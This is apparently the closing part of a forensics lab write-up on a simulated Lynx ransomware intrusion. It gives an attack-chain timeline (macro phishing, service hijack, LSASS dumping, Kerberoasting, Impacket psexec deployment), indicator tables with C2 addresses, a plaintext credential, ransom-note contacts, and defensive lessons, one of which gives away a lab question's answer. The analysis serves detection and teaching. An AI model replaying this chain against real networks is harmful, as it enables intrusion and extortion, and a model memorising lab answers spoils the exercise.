        │   └── Q1-HR-Policy-Update.docm staged (10:35:09) → pushed via SMB → FILESVR01\Shares\PUBLIC\ (10:38:23)
        │       └── jsmith opens on WS-HR01, WINWORD.EXE (11:17:09)
        │           └── macro drops+execs rad125F4.tmp.exe (11:17:27–11:17:29)  ← C2 callback :6666 (11:17:33)
        │               └── [Privilege Escalation] cmd.exe (11:17:38) → powershell.exe (11:19:11)
        │                   ├── [Discovery] winPEASx64.exe dropped (11:25:38)
        │                   │   └── DNS 1[.]1[.]1[.]1 → 18[.]64[.]211[.]110, 10[.]10[.]11[.]57 (11:27:41–42)  ← unattributed svchost.exe :4444
        │                   └── [Privilege Escalation] icacls flags C:\Tools\VulnSvc.exe writable (11:32:15)
        │                       └── overwritten w/ vulnsvc_system.exe (11:34:43–11:35:16) → SYSTEM  ← C2 callback :5555 (11:37–11:42)
        │                           └── [Credential Access] LSASS memory dump via VulnSvc.exe (11:39:47)
        │                               └── helpdesk01 cleartext cred validated → DC01 logon (12:18:00)
        │
        ├── [Credential Access — parallel paths]
        │   ├── AS-REP Roasting: jsmith (PreAuthType=0, ~10:39–12:14)
        │   └── Kerberoasting: marketing01 → svc_sql, svc_web, svc_sync (RC4-HMAC)
        │
        ├── [Persistence] (on DC01, post credential access)
        │   ├── admnistrator (typosquat) added to Domain Admins (12:30:56)
        │   └── AnyDesk installed as service (12:34:21)
        │
        ├── [Cross-Forest Pivot]
        │   └── svc_sync NTLM spray from 10[.]10[.]5[.]37 → partner.local (12:52:45–12:57:24)
        │
        ├── [Ransomware Deployment — manual]
        │   └── attacker's RDP session drops lynx.exe → BEACHHEAD C:\Windows\SysWOW64\ (13:32:26–13:33:13)
        │
        └── [Ransomware Deployment — mass, via Impacket psexec.py]
            └── randomized service binaries → ADMIN$ (12:25:52–14:15:10)
                ├── DC01, CORP-DC02, WS-IT01, WS-HR01
                ├── FILESVR01, BACKUPSVR01
                └── PART-DC01  ← cross-forest reach confirmed
                    └── [Impact]
                        ├── background-image.jpg wallpaper defacement, all 8 hosts (13:35:00–14:14:02)
                        └── lynx.exe active encryption (skips .exe/.msi/.dll/.lynx, 700+ files on workstations)
```

# Artifacts

**Network Indicators**

| Type | Value |
| --- | --- |
| Initial pivot host (Linux dev server) | `10.10.5.37` |
| Sanctioned jump box (baseline) | `10.10.6.205` |
| C2 / staging server | `52.58.62.68` |
| C2 port — payload downloads | `80` |
| C2 port — initial macro-borne shell | `6666` |
| C2 port — SYSTEM shell (post-privesc) | `5555` |
| C2 port — unattributed svchost.exe callback | `4444` |
| winPEAS DNS resolver (bypass internal) | `1.1.1.1` |
| winPEAS destination IP | `18.64.211.110` |

**Host Indicators**

| Type | Value |
| --- | --- |
| Beachhead host | `BEACHHEAD` |
| Phishing target host | `WS-HR01` |
| File server (phishing document drop) | `FILESVR01` |
| Domain controller (`corp.local`) | `DC01` |
| Domain controller #2 (`corp.local`) | `CORP-DC02` |
| Domain controller (`partner.local`) | `PART-DC01` |
| Additional deployment targets | `WS-IT01`, `BACKUPSVR01` |
| Phishing document | `Q1-HR-Policy-Update.docm` |
| Macro-dropped payload | `C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe` |
| Privesc enumeration tool | `C:\Users\jsmith\winPEASx64.exe` |
| Malicious service replacement | `C:\Users\jsmith\vulnsvc_system.exe` |
| Original hijacked service binary | `C:\Tools\VulnSvc.exe` |
| Wallpaper defacement image | `C:\Windows\Temp\background-image.jpg` |
| AnyDesk persistence binary | `C:\ProgramData\AnyDesk\AnyDesk.exe` |

**Credential Indicators**

| Type | Value |
| --- | --- |
| Initial RDP foothold account | `marketing01` |
| Plaintext leaked credential | `b4l3ri0n:Password123` |
| AS-REP Roasted account | `jsmith` |
| Kerberoasted accounts | `svc_sql`, `svc_web`, `svc_sync` |
| LSASS-dumped high-priv account | `helpdesk01` |
| Password reused cross-forest | `svc_sync` |
| Typosquatted Domain Admin account | `admnistrator` |

**Ransomware Binary Indicators**

| Type | Value |
| --- | --- |
| File name | `lynx.exe` / `lynx.bin` |
| SHA256 | `EAA0E773EB593B0046452F420B6DB8A47178C09E6DB0FA68F6A2D42C3F48E3BC` |
| PE compile timestamp | `2024-07-25 07:57:55 UTC` |
| PE subsystem | `IMAGE_SUBSYSTEM_WINDOWS_CUI` |
| Embedded PDB path | `E:\Lynx\Release\Lynx.pdb` |
| Suspicious imports | `CRYPT32.dll`, `RstrtMgr.dll`, `MPR.dll` |
| Ransom-note decode helper (IDA auto-name) | `sub_401370` |
| Skipped extensions | `.exe`, `.msi`, `.dll`, `.lynx` |
| Deployment tool | `impacket psexec.py` |
| Mass-deployment drop path | `%systemroot%\<random>.exe` |
| Manual first-touch drop path | `C:\Windows\SysWOW64\lynx.exe` |

**Ransom Note Indicators**

| Type | Value |
| --- | --- |
| TOR contact URL | `hxxp://lynxch2k5xi35j7hlbmwl7d6u2oz4vp2wqp6qkwol624cod3d6iqiyqd[.]onion/login` |
| TOR disclosure/leak site | `hxxp://lynxbllrfr5262yvbgtqoyq76s7mpztcqkv6tjjxgpilpma7nyoeohyd[.]onion/disclosures` |
| Contact email | `martina.lestariid1898[@]proton.me` |
| Clearnet mirror | `hxxp://lynxblog[.]net/` |

# Lab Insights

- Dual entry points, one blast radius. The architecture diagram flagged both `BEACHHEAD` (exposed RDP) and the Linux dev server (`10.10.5.37`, dual-homed/unmonitored) as plausible initial vectors — the actual anomaly wasn't in what was exposed, but in who the traffic came from relative to the sanctioned jump box baseline (`10.10.6.205`). A single "any RDP not from X" filter cut through the ambiguity faster than guessing which host mattered more.
- Three independent credential-access paths ran in parallel, not sequentially. LSASS dumping (`VulnSvc.exe`), AS-REP Roasting (`jsmith`), and Kerberoasting (`svc_sql`/`svc_web`/`svc_sync`) were all viable simultaneously from a single low-privilege foothold. None of them tripped a single failed-logon event — the common thread across all three is that Kerberos/credential-dumping abuse is "successful by design" from the protocol's perspective, which is exactly what makes it invisible to failure-based alerting.
- Named pipes as remote command-and-control plumbing, not just local IPC. The Impacket `psexec.py` deployment made concrete something usually left abstract: SMB extends the local named-pipe IPC model across the network via `IPC$`, letting a remote shell's stdin/stdout tunnel over the same session used to drop the binary. The "Pipe Created" event volume ended up being a stronger tool fingerprint than the process-creation events themselves.
- Filename ≠ file identity. The mass-deployed binaries had randomized on-disk names (`WvLYkAEp.exe`, etc.) specifically to defeat naive filename-based hunting, but every meaningful behavioral artifact (CAPI2 catalog checks, encryption file-creates, the manual RDP-session drop) consistently referenced the binary's "true" identity as `lynx.exe`. Hash/behavior-based pivoting beat name-based searching every time this came up.
- Static analysis mirrored the dynamic chain almost exactly. The `RstrtMgr.dll`/`MPR.dll`/`CRYPT32.dll` import triage predicted, before any disassembly, that the binary would (a) force-close file locks, (b) reach network shares, and (c) decode an embedded blob — all three were later confirmed directly in IDA (Restart Manager calls, `WNetEnumResourceW`, and the `CryptStringToBinaryA` → ransom-note decode chain). Import-table triage is a legitimate first-pass roadmap for where to point the disassembler.
- The "4 skipped extensions" question had a trap. `.exe`/`.msi`/`.dll`/`.lynx` were the literal answer, but the skip logic didn't stop there — it also matched on filename substrings (`LYNX`, `README.txt`) via a separate helper function. Good reminder that a disassembled comparison chain can extend past the specific fields a question asks about; worth reading past the "answer" block before assuming the logic is fully understood.
- PDB paths remain an underrated attribution artifact. `E:\Lynx\Release\Lynx.pdb` gave the malware family's actual self-assigned name directly from the developer's own build environment — more authoritative than any external naming convention, and found in seconds via PEStudio's Debug directory view rather than requiring any disassembly at all.